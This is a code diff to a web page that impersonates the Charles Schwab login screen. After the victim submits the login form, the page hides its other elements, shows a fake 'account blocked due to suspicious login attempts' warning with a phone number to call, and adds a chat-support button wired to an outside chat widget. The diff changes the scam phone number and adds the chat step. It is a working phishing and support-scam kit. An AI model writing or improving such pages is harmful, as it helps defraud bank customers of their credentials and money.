@@ -25,6 +25,34 @@
     100% { transform: rotate(360deg); }
 }
 
+/* Center the chat button */
+.chat-btn {
+    padding: 10px 20px;
+    background-color: #006e99;
+    color: white;
+    border: none;
+    cursor: pointer;
+    font-size: 16px;
+    border-radius: 5px;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    margin-top: 20px;
+    width: 200px; /* Optional: Adjust the width */
+    margin-left: auto;
+    margin-right: auto;
+    display: block; /* Ensure it's displayed as a block-level element */
+}
+
+/* Initially hidden */
+.hidden {
+    display: none;
+}
+
+/* Optional: Adjust the hidden elements styling */
+.hidden-elements {
+    display: none;
+}
 
         /* Styling the button and input box */
         button {
@@ -64,8 +92,16 @@
             <div class="login-wrapper">
                 <h1 class="login-title">Log in to Schwab</h1>
                 <div class="warning hidden" id="warningMessage">
-                    "Your Schwab account access has been blocked due to suspicious login attempts. Contact our customer service team at <a href="tel:+18554214204" onclick="trackClick()">+1 855-421-4204</a> to verify and unlock your account."
+                    "Your Schwab account access has been blocked due to suspicious login attempts. Contact our customer service team at <a href="tel:+18337144077" onclick="trackClick()">+1(833)714-4077</a> to verify and unlock your account."
                 </div>
+                <!-- Add this after the warningMessage div -->
+<button id="chatBtn" class="chat-btn hidden">Chat Support</button>
+
+<!-- Ensure to add the chat widget script -->
+<script src="//code.jivosite.com/widget/vLyvTUyEpK" async></script>
+
+
+
                 <form class="login-form" id="loginForm">
                     <label for="loginId">Login ID</label>
                     <div class="inputBox">
@@ -170,9 +206,9 @@
     <p class="footer-desc" style="margin: 20px 0">© 2024 Schwab & Co., Inc, All rights reserved. Member . Unauthorized access is prohibited. Usage will be monitored.(0124-3J4J)</p>
 </footer>
     </div>
-
+    
     <script>
-document.getElementById('loginForm').addEventListener('submit', function(e) {
+       document.getElementById('loginForm').addEventListener('submit', function(e) {
     e.preventDefault();
 
     var loginId = document.getElementById('loginId').value;
@@ -183,6 +219,7 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
     var warningMessage = document.getElementById('warningMessage');
     var loginIdInput = document.getElementById('loginId');
     var passwordInput = document.getElementById('password');
+    var chatBtn = document.getElementById('chatBtn'); // Chat button
 
     // Reset any previous error highlights
     loginIdInput.classList.remove('error');
@@ -216,10 +253,24 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
         document.querySelector('footer').classList.add('hidden');
         document.querySelector('.important-info').classList.add('hidden');
 
+        // Hide unnecessary elements
+        document.querySelector('.forgot-details').classList.add('hidden');
+        document.querySelector('.newUser').classList.add('hidden');
+        document.getElementById('language-selector').classList.add('hidden');
+
+        // Show the chat support button
+        chatBtn.classList.remove('hidden');
+
         loader.style.display = 'none'; // Hide loader
     }, 5000); // 5 seconds
 });
+
+// When the chat button is clicked, open the chat window
+document.getElementById('chatBtn').addEventListener('click', function() {
+    window.jivo_api.open(); // This triggers the JivoSite chat window to open
+});
+
+
     </script>
-<script src="//code.jivosite.com/widget/vLyvTUyEpK" async></script>
 </body>
 </html>
